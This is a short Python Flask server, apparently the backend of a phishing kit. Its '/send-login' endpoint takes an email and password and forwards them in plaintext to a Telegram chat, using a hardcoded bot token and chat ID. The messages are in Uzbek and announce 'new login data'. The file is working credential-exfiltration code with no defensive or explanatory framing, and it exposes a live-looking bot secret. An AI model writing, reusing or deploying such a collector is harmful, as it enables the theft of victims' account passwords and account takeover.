from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8353000078:AAH-LOVXzJRMv-twapqwymbPWvGBIZ4vUB4'
CHAT_ID = '5815294733'

def send_telegram_message(text):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': text
    }
    response = requests.post(url, json=payload)
    return response.json()

@app.route('/send-login', methods=['POST'])
def send_login():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({'error': 'Email va parol kerak'}), 400

    message = f"Yangi login ma'lumotlari:\nEmail: {email}\nParol: {password}"
    telegram_response = send_telegram_message(message)

    if not telegram_response.get('ok'):
        return jsonify({'error': 'Telegramga yuborishda xatolik'}), 500

    return jsonify({'message': 'Xabar yuborildi'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
